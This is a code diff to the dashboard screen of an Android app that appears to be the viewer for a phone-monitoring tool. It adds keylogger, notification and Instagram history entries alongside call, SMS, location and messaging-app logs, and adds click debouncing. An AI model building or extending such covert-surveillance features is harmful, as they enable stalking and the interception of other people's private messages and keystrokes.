@@ -28,9 +28,11 @@ import static com.scp.viewer.API.Global.GET_CALENDAR_HISTORY;
 import static com.scp.viewer.API.Global.GET_CALL_HISTORY;
 import static com.scp.viewer.API.Global.GET_CLIPBOARD_HISTORY;
 import static com.scp.viewer.API.Global.GET_CONTACT_HISTORY;
+import static com.scp.viewer.API.Global.GET_KEYLOGGER_HISTORY;
 import static com.scp.viewer.API.Global.GET_LOCATION_HISTORY;
 import static com.scp.viewer.API.Global.GET_NETWORK_HISTORY;
 import static com.scp.viewer.API.Global.GET_NOTES_HISTORY;
+import static com.scp.viewer.API.Global.GET_NOTIFICATION_HISTORY;
 import static com.scp.viewer.API.Global.GET_PHONE_CALL_RECORDING;
 import static com.scp.viewer.API.Global.GET_PHOTO_HISTORY;
 import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
@@ -45,6 +47,8 @@ public class DashBoard extends AppCompatActivity {
     private Button btn_Sync_Settings;
     public Table table;
     private RecyclerView.Adapter mAdapter;
+    private long mLastClickTime = System.currentTimeMillis();
+    private static final long CLICK_TIME_INTERVAL = 300;
     private String packageID;
     ArrayList<Feature> featureList;
     @Override
@@ -88,26 +92,24 @@ public class DashBoard extends AppCompatActivity {
         featureList.add(new Feature(R.drawable.app_install, getApplicationContext().getResources().getString(R.string.APPLICATION_INSTALL), GET_APP_INSTALLATION_HISTORY)); // 2021-07-12
         featureList.add(new Feature(R.drawable.ic_clipboard, getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY), GET_CLIPBOARD_HISTORY));
 
+        featureList.add(new Feature(R.drawable.note_icon, getApplicationContext().getResources().getString(R.string.NOTES_HISTORY), GET_NOTES_HISTORY));
+        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY), GET_CALENDAR_HISTORY));
+        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.NETWORK_HISTORY),GET_NETWORK_HISTORY));
+        featureList.add(new Feature(R.drawable.ic_youtube, getApplicationContext().getResources().getString(R.string.YOUTUBE_HISTORY), GET_YOUTUBE_HISTORY));
+        featureList.add(new Feature(R.drawable.notification_icon,getApplicationContext().getResources().getString(R.string.NOTIFICATION_HISTORY), GET_NOTIFICATION_HISTORY));
+        featureList.add(new Feature(R.drawable.keylogger_icon,getApplicationContext().getResources().getString(R.string.KEYLOGGER_HISTORY), GET_KEYLOGGER_HISTORY));
+
         featureList.add(new Feature(R.drawable.whatsapp_icon, getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY), GET_SMS_HISTORY));
         featureList.add(new Feature(R.drawable.viber_icon, getApplicationContext().getResources().getString(R.string.VIBER_HISTORY), GET_SMS_HISTORY));
         featureList.add(new Feature(R.drawable.messenger_small, getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY), GET_SMS_HISTORY));
         featureList.add(new Feature(R.drawable.skype_icon, getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY), GET_SMS_HISTORY));
         featureList.add(new Feature(R.drawable.hangoust, getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY), GET_SMS_HISTORY));
+        featureList.add(new Feature(R.drawable.instagram_icon, getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY), GET_SMS_HISTORY)); // 2021-07-23
 
-        featureList.add(new Feature(R.drawable.note_icon, getApplicationContext().getResources().getString(R.string.NOTES_HISTORY), GET_NOTES_HISTORY));
-        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY), GET_CALENDAR_HISTORY));
-        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.NETWORK_HISTORY),GET_NETWORK_HISTORY));
-        featureList.add(new Feature(R.drawable.ic_youtube, getApplicationContext().getResources().getString(R.string.YOUTUBE_HISTORY), GET_YOUTUBE_HISTORY));
 
 
         /* featureList.add(new Feature(R.drawable.instagram_icon,getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY),""));
-        featureList.add(new Feature(R.drawable.keylogger_icon,getApplicationContext().getResources().getString(R.string.KEYLOGGER_HISTORY),""));
-        featureList.add(new Feature(R.drawable.notification_icon,getApplicationContext().getResources().getString(R.string.NOTIFICATION_HISTORY),""));
-        featureList.add(new Feature(R.drawable.alert_icons,getApplicationContext().getResources().getString(R.string.Alert_HISTORY),""));
-        featureList.add(new Feature(R.drawable.app_install,getApplicationContext().getResources().getString(R.string.APP_INSTALL),""));
-        featureList.add(new Feature(R.drawable.keyboard_icon,getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY),""));
-        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY),""));
-        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.WIFI_HISTORY),""));*/
+        featureList.add(new Feature(R.drawable.alert_icons,getApplicationContext().getResources().getString(R.string.Alert_HISTORY),""));*/
 
         APIDatabase.getTimeLastSync(txt_Last_Sync, DashBoard.this, table.getLast_Online());
         // adapter
@@ -117,11 +119,17 @@ public class DashBoard extends AppCompatActivity {
         btn_Sync_Settings.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                Intent intent = new Intent(getApplicationContext(), SyncSettings.class);
-                //  intent sends the device object to the class Dashboard
-                intent.putExtra("device", table.getID());
-                intent.putExtra("packageID",ManagementDevice.packageID);
-                startActivity(intent);
+                long now = System.currentTimeMillis();
+                if (now - mLastClickTime > CLICK_TIME_INTERVAL) {
+
+                    Log.d("mLastClickTime", "mLastClickTime = " + mLastClickTime);
+                    Intent intent = new Intent(getApplicationContext(), SyncSettings.class);
+                    //  intent sends the device object to the class Dashboard
+                    intent.putExtra("device", table.getID());
+                    intent.putExtra("packageID",ManagementDevice.packageID);
+                    startActivity(intent);
+                }
+                 mLastClickTime = now;
             }
         });
     }
